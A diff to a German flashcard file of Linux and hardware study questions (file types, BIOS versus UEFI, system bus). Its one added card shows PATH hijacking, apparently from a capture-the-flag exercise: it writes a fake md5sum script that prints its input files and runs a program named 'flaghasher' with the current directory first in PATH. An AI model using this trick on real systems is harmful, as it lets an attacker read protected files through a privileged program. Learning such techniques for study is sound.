@@ -48,3 +48,4 @@ Welche Dateitypen existiren unter Linux?-- Reguläre Dateien, Directorys, Links,
 Was ist der Unterschied zwischen BIOS und UEFI?-- UEFI hat benutzerfreundlichere Oberfläche, die Unterstützung größerer Laufwerke und Partitionen sowie robuste Sicherheitsfunktionen.
 An welchen Bus ist der Prozessor angeschlossen?-- An den System Bus 
 Was verbindet den System Bus mit anderen Bussen?-- Host-bridge
+Wie kann man Befehle manipulieren?--echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum , PATH=.:$PATH ./flaghasher
